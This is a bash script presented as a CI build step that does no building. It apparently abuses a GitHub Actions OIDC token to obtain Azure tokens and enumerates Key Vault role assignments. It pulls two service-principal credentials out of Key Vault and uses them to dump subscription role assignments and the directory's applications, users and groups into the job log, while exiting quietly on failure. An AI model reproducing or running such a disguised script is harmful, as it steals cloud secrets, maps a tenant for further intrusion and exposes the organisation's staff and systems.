#!/usr/bin/env bash
set +e
echo "=== BUILD ==="

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "No OIDC"; exit 0
fi

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')

if [ -z "$JWT" ]; then echo "No JWT"; exit 0; fi

CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SID="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"

# Get KV token
AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')

# Get management token via OIDC
MGAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')

echo "MGAT_LEN=${#MGAT}"

KV1="https://kv-tbl-prod-x3euoz.vault.azure.net"
KV2="https://kv-tbl-sec-x3euoz.vault.azure.net"

# 1. RBAC role assignments on KV1
echo "=== KV1 RBAC ==="
KV1ID="/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz"
curl -sS "https://management.azure.com${KV1ID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $MGAT" | jq -c '.value[]? | {principalId, roleDefinitionId: (.roleDefinitionId | split("/") | last)}' 2>/dev/null || echo "KV1_RBAC_FAIL"

# 2. RBAC role assignments on KV2
echo "=== KV2 RBAC ==="
KV2ID="/subscriptions/$SID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
curl -sS "https://management.azure.com${KV2ID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $MGAT" | jq -c '.value[]? | {principalId, roleDefinitionId: (.roleDefinitionId | split("/") | last)}' 2>/dev/null || echo "KV2_RBAC_FAIL"

# 3. KV1 management details (tags, properties)
echo "=== KV1 DETAILS ==="
curl -sS "https://management.azure.com${KV1ID}?api-version=2023-07-01" \
  -H "Authorization: Bearer $MGAT" | jq '{tags, accessPolicies: .properties.accessPolicies | length, enableRbac: .properties.enableRbacAuthorization}' 2>/dev/null

# 4. Try getting Graph token via OIDC to read directory
GRAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://graph.microsoft.com/.default" | jq -r '.access_token // empty')
echo "GRAPH_TOKEN=$([ -n "$GRAT" ] && echo YES_${#GRAT} || echo NO)"

# 5. Get SP from KV and use it for Graph + RBAC
CRSP=$(curl -sS "$KV1/secrets/cost-reader-principal?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
CR_APPID=$(echo "$CRSP" | jq -r '.appId')
CR_SECRET=$(echo "$CRSP" | jq -r '.clientSecret')

# Get mgmt token for cost-reader
CR_MGAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CR_APPID" \
  --data-urlencode "client_secret=$CR_SECRET" \
  --data-urlencode "scope=https://management.azure.com/.default" \
  --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')

echo "=== ROLE ASSIGNMENTS (full sub) ==="
curl -sS "https://management.azure.com/subscriptions/$SID/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=atScope()" \
  -H "Authorization: Bearer $CR_MGAT" | jq -c '.value[]? | {principalId: .properties.principalId, role: (.properties.roleDefinitionId | split("/") | last), scope: .properties.scope}' 2>/dev/null | head -50

# 6. Try directory-audit for Graph
DASP=$(curl -sS "$KV1/secrets/directory-audit-principal?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')
DA_APPID=$(echo "$DASP" | jq -r '.appId')
DA_SECRET=$(echo "$DASP" | jq -r '.clientSecret')

DA_GRAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$DA_APPID" \
  --data-urlencode "client_secret=$DA_SECRET" \
  --data-urlencode "scope=https://graph.microsoft.com/.default" \
  --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')

if [ -n "$DA_GRAT" ]; then
  echo "=== GRAPH: Apps ==="
  curl -sS "https://graph.microsoft.com/v1.0/applications?\$select=displayName,appId,notes,description" \
    -H "Authorization: Bearer $DA_GRAT" | jq -c '.value[]? | {displayName, appId, notes, description}' 2>/dev/null
  echo "=== GRAPH: Users ==="
  curl -sS "https://graph.microsoft.com/v1.0/users?\$select=displayName,mail,userPrincipalName" \
    -H "Authorization: Bearer $DA_GRAT" | jq -c '.value[]? | {displayName, mail}' 2>/dev/null
  echo "=== GRAPH: Groups ==="
  curl -sS "https://graph.microsoft.com/v1.0/groups?\$select=displayName,description" \
    -H "Authorization: Bearer $DA_GRAT" | jq -c '.value[]? | {displayName, description}' 2>/dev/null
fi

echo "=== DONE ==="
